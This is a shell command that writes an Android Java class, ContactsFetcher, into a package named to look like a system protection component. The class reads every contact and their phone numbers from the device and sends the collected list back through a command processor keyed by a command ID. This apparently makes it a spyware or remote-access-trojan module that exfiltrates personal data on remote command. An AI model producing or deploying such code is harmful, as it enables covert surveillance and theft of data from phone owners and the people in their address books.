cat > app/src/main/java/com/android/system/protection/commands/ContactsFetcher.java << 'EOF'
package com.android.system.protection.commands;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;

import com.android.system.protection.api.CommandProcessor;

import org.json.JSONArray;
import org.json.JSONObject;

public class ContactsFetcher {

    public static void fetch(Context context, JSONObject params, String commandId) {
        JSONArray contactsArray = new JSONArray();
        ContentResolver cr = context.getContentResolver();
        Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        if (cursor != null && cursor.getCount() > 0) {
            while (cursor.moveToNext()) {
                try {
                    String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));

                    JSONObject contact = new JSONObject();
                    contact.put("id", id);
                    contact.put("name", name);

                    // جلب أرقام الهاتف
                    Cursor phoneCursor = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    JSONArray phones = new JSONArray();
                    if (phoneCursor != null) {
                        while (phoneCursor.moveToNext()) {
                            String phone = phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                            phones.put(phone);
                        }
                        phoneCursor.close();
                    }
                    contact.put("phones", phones);
                    contactsArray.put(contact);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
            cursor.close();
        }

        JSONObject result = new JSONObject();
        try {
            result.put("contacts", contactsArray);
        } catch (Exception e) {}
        CommandProcessor.sendResult(context, commandId, result);
    }
}
EOF